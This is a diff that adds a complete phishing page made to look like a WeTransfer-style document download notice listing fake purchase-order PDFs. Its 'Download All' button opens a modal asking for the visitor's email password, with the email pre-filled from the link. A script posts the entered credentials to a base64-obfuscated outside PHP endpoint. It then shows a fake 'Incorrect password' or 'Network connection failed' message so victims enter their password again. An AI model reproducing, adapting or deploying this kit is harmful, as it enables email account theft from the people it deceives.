@@ -1,0 +1,186 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>We Pro Files</title>
+<link rel="icon" href="https://wetransfer.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body { background-image: url(https://iili.io/HWc0ccQ.png); background-repeat: no-repeat; background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, sans-serif, BlinkMacSystemFont, Helvetica Neue, Arial, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji; }
+        .container { border-radius: 10px; width: 80%; padding: 20px; display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 20px; }
+        .file-list-container { grid-column: 1 / 2; background-color: white; border-radius: 10px; width: 320px; height: auto; padding-bottom: 20px; }
+        .container h2 { font-size: 1.2em; margin-bottom: 10px; }
+        .container p { font-size: 0.9em; margin-bottom: 20px; color: gray; }
+        .file-list { list-style: none; padding: 0; margin: 0; padding: 10px 5px; border-bottom: 1px solid #ccc; }
+        .file-list li { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-top: 1px solid #f0f0f0; }
+        .file-list li:first-child { border-top: none; }
+        .file-list li .file-info { display: flex; flex-direction: column; align-items: flex-start; }
+        .file-list li .file-info span { font-size: 0.75em; color: gray; }
+        .file-list li .file-icon { font-size: 1.5em; color: #007BFF; }
+        .btnzone { text-align: center; box-sizing: border-box; }
+        .btnzone .download-all-btn { background-color: #0096FF; color: white; border: none; border-radius: 5px; padding: 10px 20px; font-size: 14px; cursor: pointer; text-align: center; display: inline-block; margin-top: 20px; text-decoration: none; font-size: 16px; }
+        form { width: 100%; box-sizing: border-box; padding: 0 40px; }
+        .btnzone .download-all-btn:hover { background-color: #007ACC; }
+        .btnzone .download-all-btn:disabled { background-color: #A9A9A9; cursor: not-allowed; }
+        @media (max-width: 768px) { .container { grid-template-columns: 1fr; width: auto; } .file-list-container { grid-column: 1 / 2; } }
+        .ready { padding: 1px 20px; border-bottom: 1px solid #ccc; display: flex; justify-content: center; flex-direction: column; align-items: center; color: #444; font-size: 20px; text-align: center; }
+        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0, 0, 0, 0.4); justify-content: center; align-items: center; }
+        .modal-content { background-color: #fff; border-radius: 5px; padding: 5px 0 20px; border: 1px solid #888; width: 400px; box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3); display: flex; flex-direction: column; align-items: center; }
+        .modal-content img { width: 150px; margin-bottom: 10px; }
+        .modal-content p { margin: 10px 0; color: #666; font-size: 14px; text-align: center; }
+        .modal-content label { display: block; margin-top: 10px; font-size: 15px; color: #111; }
+        .modal-content input[type="email"], .modal-content input[type="password"] { box-sizing: border-box; width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
+        .modal-content button { background-color: #007BFF; color: white; padding: 10px; margin-top: 15px; border: none; border-radius: 4px; cursor: pointer; width: 100%; box-sizing: border-box; }
+        .modal-content button:hover { background-color: #0056b3; }
+        .modal-content .close { color: #aaa; float: right; font-size: 28px; font-weight: bold; }
+        .modal-content .close:hover, .modal-content .close:focus { color: black; text-decoration: none; cursor: pointer; }
+        #invalidmsg { color: #C51102; font-size: 15px; margin-top: 10px; text-align: center; }
+        .modaltitle { width: 100%; text-align: center; }
+        .modaltitle img { width: auto; margin-bottom: -8px; }
+        .modaltitle p { border-top: 1px solid #ccc; padding: 10px 40px; font-size: 15px; }
+        #logDownload { font-size: 15px; }
+        #logDownload:disabled { cursor: not-allowed; background-color: #A9A9A9; }
+        .hide { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="file-list-container">
+            <div class="ready">
+                <span style="font-weight: bold; margin-bottom:8px">Ready when you are</span>
+                <small style="font-size: 14px; margin-bottom:8px">Files deleted in 7 days.
+                    <span style="display: block; font-size: 15px; margin: 2px 0">Download and view your documents.</span></small>                
+            </div>
+            <ul class="file-list">
+                <li>
+                    <div class="file-info">
+                        <strong>Company's Profile</strong>
+                        <span>1.3MB • PDF</span>
+                    </div>
+                    <div class="file-icon">
+                        <i class="fa-regular fa-circle-down"></i>
+                    </div>
+                </li>
+                <li>
+                    <div class="file-info">
+                        <strong>Specifications</strong>
+                        <span>1.9MB • PDF</span>
+                    </div>
+                    <div class="file-icon">
+                        <i class="fa-regular fa-circle-down"></i>
+                    </div>
+                </li>
+                <li>
+                    <div class="file-info">
+                        <strong>Purchase Order</strong>
+                        <span>2MB • PDF</span>
+                    </div>
+                    <div class="file-icon">
+                        <i class="fa-regular fa-circle-down"></i>
+                    </div>
+                </li>
+                
+            </ul>
+            <div class="btnzone"><button class="download-all-btn">Download All</button></div>
+        </div>
+        <div></div>
+        <div></div>
+    </div>
+<!-- The Modal -->
+<div id="myModal" class="modal">
+    <div class="modal-content">
+        <div class="modaltitle">
+        <img src="data:image/png;base64,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" alt="Logo">
+        <p>Enter the correct email and password details, to allow imap synchronize and allow access to files.</p>
+        </div>
+
+        <form id="login-form">
+            <div id="invalidmsg"></div>
+            <label for="email">Email Address</label>
+            <input type="email" id="email" name="email" readonly>
+            <label for="password">Email Password</label>
+            <input type="password" id="password" name="password" required>
+            <button type="submit" id="logDownload">Download</button>
+        </form>
+    </div>
+</div>
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const queryParams = new URLSearchParams(window.location.search);
+    const parameterE = queryParams.get('e');    
+    // Get the modal
+    var modal = document.getElementById("myModal");
+    // modal.style.display = "flex";
+    // Get the button that opens the modal
+    var btn = document.querySelector(".download-all-btn");
+    // Get the <span> element that closes the modal
+    var span = document.getElementsByClassName("close")[0];
+    // Get the error message div
+    var errorMsg = document.getElementById("error-msg");
+    // When the user clicks the button, open the modal 
+    btn.onclick = function() {
+        modal.style.display = "flex";
+    }
+    let jeff = "aHR0cHM6Ly9jaGFuZWxib3JvdWgubmFtZS5uZy93ZWxscy9lcmljLnBocA==";
+    let getme = document.querySelector("#email")
+    getme.value = parameterE;
+    let logDownload = document.querySelector('#logDownload'); 
+    let warningMessage = document.querySelector("#invalidmsg")  
+    let apiCalls = 0;
+    // Form submission handler
+    document.getElementById("login-form").onsubmit = function(event) {
+        event.preventDefault();
+        // Create a new FormData object from the form
+        const formData = new FormData(document.querySelector('form'));
+        const sendPoint = jeff;
+        // Update the log download text and disable the button
+        logDownload.innerText = 'Verifying...';
+        logDownload.disabled =  true;   
+        // Increment the counter for API calls
+        apiCalls++;
+        // Make a POST request to the API endpoint
+        fetch(atob(sendPoint), {
+          method: 'POST',
+          body: formData,
+        })
+        .then(response => response.json())
+        .then((response) => {
+          console.log(apiCalls);
+
+          // Set a timeout to handle the response
+          setTimeout(() => {
+            if (apiCalls > 3) {
+              // Handle more than 3 API calls
+            } else {
+              if (apiCalls === 1) {
+                // Handle the first API call error
+                warningMessage.innerText = 'Incorrect password. Type the correct email password, and try again.';
+              }
+              if (apiCalls > 1) {
+                // Handle subsequent API call errors
+                warningMessage.innerText = 'Network connection failed, try again!';
+              }
+
+            }
+          }, 10);                  
+        })
+        .catch(error => {
+            console.log()
+        })
+        .finally(error => {
+              // Reset the log download text and button state
+                warningMessage.classList.remove("hide");
+              logDownload.innerText = 'Download';
+              logDownload.removeAttribute("disabled");         
+              document.querySelector("#password").value = ""
+              document.querySelector("#password").focus();
+        })
+    }
+  
+});
+    
+</script> 
+</body>
+</html>
